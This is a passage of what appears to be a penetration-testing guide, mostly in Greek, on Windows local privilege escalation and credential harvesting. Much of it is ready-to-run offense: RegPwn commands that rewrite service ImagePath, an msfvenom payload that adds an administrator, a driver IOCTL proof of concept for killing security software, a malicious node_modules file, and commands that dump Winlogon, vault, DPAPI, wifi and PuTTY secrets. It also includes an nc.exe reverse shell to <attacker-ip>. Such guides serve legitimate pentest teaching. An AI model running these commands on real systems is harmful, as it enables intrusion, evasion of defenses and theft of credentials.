- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Δικαιώματα Services registry AppendData/AddSubdirectory

Αν έχετε αυτή την άδεια πάνω σε ένα registry, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε sub registries από αυτόν**. Στην περίπτωση των Windows services, αυτό είναι **αρκετό για να εκτελέσετε arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν το path προς ένα executable δεν είναι μέσα σε quotes, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε ending πριν από ένα space.

Για παράδειγμα, για το path _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Λίστα όλων των unquoted service paths, εξαιρώντας αυτά που ανήκουν σε built-in Windows services:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα service binary με το metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες Ανάκτησης

Τα Windows επιτρέπουν στους χρήστες να ορίζουν ενέργειες που θα εκτελούνται αν αποτύχει μια υπηρεσία. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, μπορεί να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες υπάρχουν στην [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Έλεγξε τα **permissions των binaries** (ίσως μπορείς να αντικαταστήσεις ένα και να κάνεις privilege escalation) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα Εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από έναν λογαριασμό Administrator (schedtasks).

Ένας τρόπος να βρείτε αδύναμα δικαιώματα φακέλων/αρχείων στο σύστημα είναι να κάνετε:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Το Notepad++ φορτώνει αυτόματα οποιοδήποτε plugin DLL κάτω από τα `plugins` subfolders. Αν υπάρχει writable portable/copy install, η τοποθέτηση ενός malicious plugin δίνει automatic code execution μέσα στο `notepad++.exe` σε κάθε launch (συμπεριλαμβανομένου του `DllMain` και των plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Ελέγξτε αν μπορείτε να overwrite κάποιο registry ή binary που θα εκτελεστεί από διαφορετικό user.**\
**Διαβάστε** την **ακόλουθη σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Αν ένα driver εκθέτει ένα arbitrary kernel read/write primitive (συχνό σε κακώς σχεδιασμένους IOCTL handlers), μπορείς να κάνεις escalation κλέβοντας απευθείας ένα SYSTEM token από τη kernel memory. Δες τη βήμα-βήμα technique εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Για race-condition bugs όπου η vulnerable call ανοίγει ένα attacker-controlled Object Manager path, η σκόπιμη επιβράδυνση του lookup (με max-length components ή deep directory chains) μπορεί να επεκτείνει το window από microseconds σε tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Τα σύγχρονα hive vulnerabilities επιτρέπουν να groom deterministic layouts, να abuse writable HKLM/HKU descendants, και να μετατρέπεις metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθε όλη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Κάποιοι signed third‑party drivers δημιουργούν το device object τους με ισχυρό SDDL μέσω IoCreateDeviceSecure αλλά ξεχνούν να ορίσουν FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτό το flag, το secure DACL δεν επιβάλλεται όταν το device ανοίγεται μέσω ενός path που περιέχει ένα επιπλέον component, επιτρέποντας σε οποιονδήποτε unprivileged user να αποκτήσει handle χρησιμοποιώντας ένα namespace path όπως:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματικό περιστατικό)

Μόλις ένας user μπορεί να ανοίξει το device, privileged IOCTLs που εκτίθενται από το driver μπορούν να abused για LPE και tampering. Ενδεικτικές δυνατότητες που παρατηρήθηκαν στο wild:
- Επιστροφή handles πλήρους πρόσβασης σε arbitrary processes (token theft / SYSTEM shell μέσω DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Τερματισμός arbitrary processes, συμπεριλαμβανομένων Protected Process/Light (PP/PPL), επιτρέποντας AV/EDR kill από user land μέσω kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations για developers
- Να ορίζετε πάντα FILE_DEVICE_SECURE_OPEN όταν δημιουργείτε device objects που προορίζονται να περιοριστούν από ένα DACL.
- Επαληθεύετε το caller context για privileged operations. Προσθέστε ελέγχους PP/PPL πριν επιτρέψετε process termination ή επιστροφές handle.
- Περιορίστε τα IOCTLs (access masks, METHOD_*, input validation) και εξετάστε brokered models αντί για direct kernel privileges.

Detection ιδέες για defenders
- Παρακολουθείτε user-mode opens ύποπτων device names (π.χ. \\ .\\amsdk*) και συγκεκριμένων IOCTL sequences που υποδηλώνουν abuse.
- Εφαρμόστε το vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και διατηρείτε τα δικά σας allow/deny lists.


## PATH DLL Hijacking

Αν έχετε **write permissions μέσα σε έναν φάκελο που υπάρχει στο PATH** μπορείτε να hijack ένα DLL που φορτώνεται από μια process και να **escalate privileges**.

Ελέγξτε τα permissions όλων των φακέλων μέσα στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να abuse αυτό το check:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking μέσω `C:\node_modules`

Αυτό είναι μια παραλλαγή **Windows uncontrolled search path** που επηρεάζει εφαρμογές **Node.js** και **Electron** όταν κάνουν ένα bare import όπως `require("foo")` και το αναμενόμενο module λείπει (**missing**).

Το Node επιλύει packages ανεβαίνοντας το directory tree και ελέγχοντας φακέλους `node_modules` σε κάθε parent. Στα Windows, αυτό το walk μπορεί να φτάσει μέχρι το drive root, οπότε μια εφαρμογή που εκκινεί από `C:\Users\Administrator\project\app.js` μπορεί τελικά να ελέγξει:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **low-privileged user** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει ένα κακόβουλο `foo.js` (ή φάκελο package) και να περιμένει μέχρι μια **higher-privileged Node/Electron process** να επιλύσει το missing dependency. Το payload εκτελείται στο security context του victim process, οπότε αυτό γίνεται **LPE** όποτε το target τρέχει ως administrator, από elevated scheduled task/service wrapper, ή από auto-started privileged desktop app.

Αυτό είναι ιδιαίτερα συνηθισμένο όταν:

- ένα dependency δηλώνεται στο `optionalDependencies`
- μια third-party library τυλίγει το `require("foo")` σε `try/catch` και συνεχίζει σε failure
- ένα package αφαιρέθηκε από production builds, παραλείφθηκε κατά το packaging ή απέτυχε να εγκατασταθεί
- το vulnerable `require()` βρίσκεται βαθιά μέσα στο dependency tree αντί για τον κύριο application code

### Hunting vulnerable targets

Χρησιμοποιήστε το **Procmon** για να αποδείξετε το resolution path:

- Φιλτράρετε με `Process Name` = target executable (`node.exe`, το Electron app EXE ή το wrapper process)
- Φιλτράρετε με `Path` `contains` `node_modules`
- Εστιάστε στο `NAME NOT FOUND` και στο τελικό επιτυχημένο open κάτω από `C:\node_modules`

Χρήσιμα code-review patterns σε unpacked `.asar` αρχεία ή application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Εκμετάλλευση

1. Εντοπίστε το **όνομα του πακέτου που λείπει** από το Procmon ή από ανασκόπηση του source.
2. Δημιουργήστε το root lookup directory αν δεν υπάρχει ήδη:
```powershell
mkdir C:\node_modules
```
3. Drop a module with the exact expected name:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Ενεργοποιήστε την εφαρμογή του θύματος. Αν η εφαρμογή προσπαθήσει `require("foo")` και το νόμιμο module απουσιάζει, το Node μπορεί να φορτώσει `C:\node_modules\foo.js`.

Πραγματικά παραδείγματα missing προαιρετικών modules που ταιριάζουν σε αυτό το μοτίβο περιλαμβάνουν τα `bluebird` και `utf-8-validate`, αλλά η **technique** είναι το επαναχρησιμοποιήσιμο μέρος: βρείτε οποιοδήποτε **missing bare import** που θα resolve ένα privileged Windows Node/Electron process.

### Detection and hardening ιδέες

- Alert όταν ένας χρήστης δημιουργεί `C:\node_modules` ή γράφει εκεί νέα `.js` files/packages.
- Hunt για high-integrity processes που διαβάζουν από `C:\node_modules\*`.
- Πακετάρετε όλα τα runtime dependencies στην production και κάντε audit τη χρήση `optionalDependencies`.
- Ελέγξτε third-party code για αθόρυβα `try { require("...") } catch {}` patterns.
- Disable τα optional probes όταν το υποστηρίζει η library (για παράδειγμα, ορισμένα `ws` deployments μπορούν να αποφύγουν το legacy `utf-8-validate` probe με `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Έλεγξε για άλλους γνωστούς υπολογιστές που είναι hardcoded στο hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Πόρτες

Ελέγξτε για **restricted services** από έξω
```bash
netstat -ano #Opened ports?
```
### Πίνακας δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Firewall

[**Ελέγξτε αυτή τη σελίδα για εντολές σχετικές με Firewall**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες[ εντολές για network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσεις root user, μπορείς να κάνεις listen σε οποιαδήποτε port (την πρώτη φορά που χρησιμοποιείς το `nc.exe` για να κάνεις listen σε ένα port, θα ρωτήσει μέσω GUI αν το `nc` πρέπει να επιτραπεί από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το `WSL` filesystem στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

Από [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει credentials χρηστών για servers, websites και άλλα programs στα οποία τα **Windows** μπορούν να **κάνουν log in τους χρήστες αυτόματα**. Με την πρώτη ματιά, αυτό μπορεί να μοιάζει σαν οι users να μπορούν πλέον να αποθηκεύουν τα Facebook credentials, Twitter credentials, Gmail credentials κ.λπ., ώστε να γίνεται αυτόματο log in μέσω browsers. Αλλά δεν ισχύει αυτό.

Το Windows Vault αποθηκεύει credentials στα οποία τα Windows μπορούν να κάνουν log in τους users αυτόματα, πράγμα που σημαίνει ότι οποιαδήποτε **Windows application που χρειάζεται credentials για να έχει πρόσβαση σε ένα resource** (server ή website) **μπορεί να χρησιμοποιήσει αυτό το Credential Manager** & Windows Vault και να χρησιμοποιήσει τα credentials που δόθηκαν αντί να πληκτρολογούν οι users συνεχώς username και password.

Εκτός αν τα applications αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι είναι δυνατό να χρησιμοποιήσουν τα credentials για ένα δεδομένο resource. Άρα, αν η application σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με το credential manager και να ζητήσει τα credentials για αυτό το resource** από το default storage vault.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τα stored credentials στο machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Τότε μπορείτε να χρησιμοποιήσετε το `runas` με τις επιλογές `/savecred` ώστε να χρησιμοποιήσετε τα αποθηκευμένα credentials. Το ακόλουθο παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο για συμμετρική κρυπτογράφηση δεδομένων, που χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος ώστε να συμβάλλει σημαντικά στην entropy.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που παράγεται από τα secrets σύνδεσης του χρήστη**. Σε σενάρια που αφορούν κρυπτογράφηση συστήματος, χρησιμοποιεί τα secrets πιστοποίησης του domain του συστήματος.

Τα κρυπτογραφημένα RSA keys χρήστη, μέσω του DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το DPAPI key, που βρίσκεται μαζί με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, συνήθως αποτελείται από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, αποτρέποντας την απαρίθμηση του περιεχομένου του μέσω της εντολής `dir` στο CMD, αν και μπορεί να γίνει απαρίθμησή του μέσω PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα arguments (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **credentials files protected by the master password** συνήθως βρίσκονται στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Διαπιστευτήρια PowerShell

Τα **PowerShell credentials** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματοποίησης ως τρόπος για την αποθήκευση κρυπτογραφημένων credentials με βολικό τρόπο. Τα credentials προστατεύονται χρησιμοποιώντας **DPAPI**, που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Για να **decrypt** ένα PS credentials από το αρχείο που το περιέχει, μπορείς να κάνεις:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες συνδέσεις RDP

Μπορείς να τις βρεις στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Εντολές που εκτελέστηκαν πρόσφατα
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use το **Mimikatz** `dpapi::rdg` module με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσεις οποιαδήποτε .rdg files**\
Μπορείς να **εξάγεις πολλά DPAPI masterkeys** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Οι άνθρωποι συχνά χρησιμοποιούν την εφαρμογή StickyNotes στα Windows workstations για να **αποθηκεύουν passwords** και άλλες πληροφορίες, χωρίς να συνειδητοποιούν ότι πρόκειται για ένα database file. Αυτό το αρχείο βρίσκεται στο `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και πάντα αξίζει να το αναζητάς και να το εξετάζεις.

### AppCmd.exe

**Σημείωση ότι για να ανακτήσεις passwords από το AppCmd.exe πρέπει να είσαι Administrator και να εκτελείς το πρόγραμμα σε High Integrity level.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το αρχείο υπάρχει, τότε είναι πιθανό να έχουν ρυθμιστεί ορισμένα **credentials** και να μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Οι installers **εκτελούνται με δικαιώματα SYSTEM**, πολλοί είναι ευάλωτοι σε **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Κλειδιά κεντρικού υπολογιστή SSH του Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys μπορούν να αποθηκευτούν μέσα στο registry key `HKCU\Software\OpenSSH\Agent\Keys` οπότε θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε καταχώρηση μέσα σε αυτό το path, πιθανότατα θα είναι ένα αποθηκευμένο SSH key. Αποθηκεύεται κρυπτογραφημένο, αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
